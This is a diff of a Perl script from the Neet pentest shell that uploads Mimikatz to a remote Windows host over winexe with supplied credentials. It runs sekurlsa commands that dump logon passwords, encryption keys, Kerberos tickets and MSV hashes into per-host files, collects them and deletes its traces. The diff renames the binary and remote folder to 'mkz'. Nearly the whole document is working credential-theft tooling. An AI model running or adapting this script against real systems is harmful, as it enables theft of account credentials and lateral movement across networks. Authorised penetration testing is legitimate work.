@@ -4,7 +4,7 @@
 #
 #    Mimikatz: Run Mimikatz remotely and locally parse the output
 #		 This is the version shipped with the Neet shell. 
-#    Copyright (C) 2014 Jonathan Roach
+#    Copyright (C) 2008-2016 Jonathan Roach
 #
 #    This program is free software: you can redistribute it and/or modify
 #    it under the terms of the GNU General Public License as published by
@@ -22,9 +22,16 @@
 #    Contact: jonnyhightower [at] funkygeek.com
 #
 ##########################################################################
+BEGIN {
+	unshift @INC, "/opt/neet/core";
+}
 
 use strict;
+use JR::Files::Config; # For finding locations
+
 my $UPLOAD="/opt/neet/upload";
+my $locations="/opt/neet/etc/locations";
+my $winexe=getPath("winexe");
 
 my ($host,$user,$pass);
 
@@ -47,12 +54,12 @@ if (!defined($pass)){
 }
 
 my $WorkingDir=$ENV{'PWD'};
-my $REMOTE_DIR="_mimikatz";
+my $REMOTE_DIR="_mkz";
 my $ERROR=1;
 my $OS="Unidentified\n";
 my $bit=32;
 my (@FILES,@RESULTS);
-my @TEMPS=("actions");
+my @TEMPS;
 
 my $banner="*** mimikatz -> $host ***";
 
@@ -77,29 +84,30 @@ if (rmkdir()){
 
 check64();
 
+@RESULTS=("passwords-${host}.txt","tickets-${host}.txt","msv-${host}.txt","kerberos-${host}.txt");
+
 if ($bit == 32){
 	print "Deploying 32-bit version....\n";
-	@FILES=("mim32/mimikatz.exe","mim32/sekurlsa.dll","mim32/mimikatz.sys","mim32/klock.dll","mim32/kappfree.dll","mim.bat");
-	@TEMPS=("actions");
-	@RESULTS=("rawmimi-${host}.txt");
+	@FILES=("mim32/mkz.exe");
 	uploadFiles();
 	print "*** Running Mimikatz...\n";
-	rexec("mim.bat > rawmimi-${host}.txt");
-
+	rexec("mkz.exe privilege::debug sekurlsa::logonPasswords sekurlsa::ekeys exit > passwords-${host}.txt");
+	rexec("mkz.exe privilege::debug sekurlsa::tickets exit > tickets-${host}.txt");
+	rexec("mkz.exe privilege::debug sekurlsa::msv exit > msv-${host}.txt");
+	rexec("mkz.exe privilege::debug sekurlsa::kerberos exit > kerberos-${host}.txt");
 } elsif ($bit == 64) {
 	print "Deploying 64-bit version....\n";
-	@FILES=("mim64/mimikatz.exe","mim64/sekurlsa.dll","mim64/mimikatz.sys","mim64/klock.dll","mim64/kappfree.dll","mim.bat");
-	@RESULTS=("rawmimi-${host}.txt");
+	@FILES=("mim64/mkz.exe");
 	uploadFiles();
 	print "*** Running Mimikatz...\n";
-	rexec("mim.bat > rawmimi-${host}.txt");
+	rexec("mkz.exe privilege::debug sekurlsa::logonPasswords sekurlsa::ekeys exit > passwords-${host}.txt");
+	rexec("mkz.exe privilege::debug sekurlsa::tickets exit > tickets-${host}.txt");
+	rexec("mkz.exe privilege::debug sekurlsa::msv exit > msv-${host}.txt");
+	rexec("mkz.exe privilege::debug sekurlsa::kerberos exit > kerberos-${host}.txt");
 }
 
 gatherData();
 cleanup();
-
-# Finally, run mimiparse on the output
-system("/opt/neet/neetsh/mimiparse rawmimi-${host}.txt > passwords-${host}.txt 2>/dev/null");
 
 my $credit='jonnyhightower [at ]funkygeek.com';
 
@@ -112,7 +120,7 @@ exit $ERROR;
 #------------------------------------------------------------------------------------------------------------------------------------------------
 
 sub authenticate {
-	my $return=`winexe --ostype=2 -U \"${user}\"%\"${pass}\" //$host \"cmd.exe /c ver\" 2>&1`;
+	my $return=`$winexe --ostype=2 -U \"${user}\"%\"${pass}\" //$host \"cmd.exe /c ver\" 2>&1`;
 
 	if ($return =~ /NT_STATUS_LOGON_FAILURE/i){
 		print STDERR "Logon failure\n";
@@ -132,30 +140,40 @@ sub authenticate {
 		$OS="2000";
 	} elsif ($return =~ /Windows XP/i){
 		$OS="XP";
-	} elsif ($return =~ /Windows \[Version 6.1.7600/i){
+	} elsif ($return =~ /Windows \[Version 6.1.7601/i){
+		$OS="7";
+	} elsif ($return =~ /Windows \[Version 6.1./i){
 		$OS="2008";
 	} elsif ($return =~ /Windows \[Version 6.0./i){
 		$OS="Vista";
+	} elsif ($return =~ /Windows \[Version 6.3.9600/i){
+		$OS="2012";
+	} elsif ($return =~ /Windows \[Version 6.3./i){
+		$OS="2012";
+	} else {
+		$return =~ s/\r//g;
+		print "UNRECOGNISED OS: \"$return\"\n";
+		$OS=undef;
 	}
 	return 1;
 }
 
 sub rexec {
 	my $cmd=shift();
-	my $rc=system("winexe --ostype=2 -U \"${user}\"%\"${pass}\" //$host \"cmd.exe /c \\\"cd \%WINDIR\%\\${REMOTE_DIR} \& ${cmd}\\\"\"");
+	my $rc=system("$winexe --ostype=2 -U \"${user}\"%\"${pass}\" //$host \"cmd.exe /c \\\"cd \%WINDIR\%\\${REMOTE_DIR} \& ${cmd}\\\"\"");
 	$rc=$rc>>8;
 	return $rc;
 }
 
 sub silentRexec {
 	my $cmd=shift();
-	my $rc=system("winexe  --ostype=2 -U \"${user}\"%\"${pass}\" //$host \"cmd.exe /c \\\"cd \%WINDIR\%\\${REMOTE_DIR} \& ${cmd}\\\"\" >/dev/null 2>&1");
+	my $rc=system("$winexe  --ostype=2 -U \"${user}\"%\"${pass}\" //$host \"cmd.exe /c \\\"cd \%WINDIR\%\\${REMOTE_DIR} \& ${cmd}\\\"\" >/dev/null 2>&1");
 	$rc=$rc>>8;
 	return $rc;
 }
 
 sub check64 {
-	my $arch1=`winexe -U \"${user}\"%\"${pass}\" //$host \"cmd.exe /c ECHO %PROCESSOR_ARCHITECTURE%\" 2>&1`;
+	my $arch1=`$winexe -U \"${user}\"%\"${pass}\" //$host \"cmd.exe /c ECHO %PROCESSOR_ARCHITECTURE%\" 2>&1`;
 	if ($arch1 =~ /AMD64/i){
 		$bit=64;
 	} 
@@ -167,7 +185,7 @@ sub cleanup {
 	# Clean up the winexe service - delete the service
 	#silentRexec("cmd.exe /c ghsc.exe delete winexesvc"); 
 	#silentRexec("cmd.exe /c net stop winexesvc");
-	system("winexe --uninstall --ostype=2 -U \"${user}\"%\"${pass}\" //$host \"cmd.exe /c ver\" >/dev/null 2>&1");
+	system("$winexe --uninstall --ostype=2 -U \"${user}\"%\"${pass}\" //$host \"cmd.exe /c ver\" >/dev/null 2>&1");
 	for my $file (@FILES,@RESULTS,@TEMPS){
 		rdel($file);
 	}
@@ -238,5 +256,23 @@ sub uploadFiles {
 		print "*** There was an error during the file upload process.\n";
 		exit 1;
 	}
+}
+
+sub getPath {
+	my $bin=shift();
+	my $binaries=Config->new("$locations");
+	my $path=$binaries->GetVal("$bin");
+	if ((!defined($path)) || (length($path)==0)){
+		for my $dir (split ":", $ENV{'PATH'}){
+			if (-f "${dir}/$bin"){
+				$path="${dir}/$bin";
+				last;
+			}
+		}
+		if ((!defined($path)) || (length($path)==0)){
+			print "Error: couldn't find path for $bin on the system\n";
+		}
+	}
+	return $path;
 }
 
